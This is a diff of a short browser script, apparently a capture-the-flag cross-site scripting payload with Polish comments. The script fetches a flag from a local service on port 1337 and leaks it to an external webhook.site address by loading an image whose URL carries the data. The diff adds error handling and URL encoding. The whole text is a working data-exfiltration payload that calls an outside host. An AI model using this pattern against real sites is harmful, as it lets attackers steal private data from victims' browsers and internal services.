@@ -1,10 +1,19 @@
 <script>
   const webhook = "https://webhook.site/736021bc-91ab-4eee-baa5-3ddd7d133d07";
+  
   fetch("http://localhost:1337/flag", { method: "GET" })
-    .then((resp) => resp.text())
+    .then((resp) => {
+      if (!resp.ok) {
+        throw new Error("Network response was not ok");
+      }
+      return resp.text();
+    })
     .then((data) => {
       const img = document.createElement("img");
-      img.src = webhook + "?output=" + data;
+      img.src = webhook + "?output=" + encodeURIComponent(data);
+      document.body.appendChild(img); // Dodajemy obraz do dokumentu
     })
-    .catch((err) => sendOutput(err));
+    .catch((err) => {
+      console.error("Fetch error: ", err); // Używamy console.error do wyświetlenia błędu
+    });
 </script>
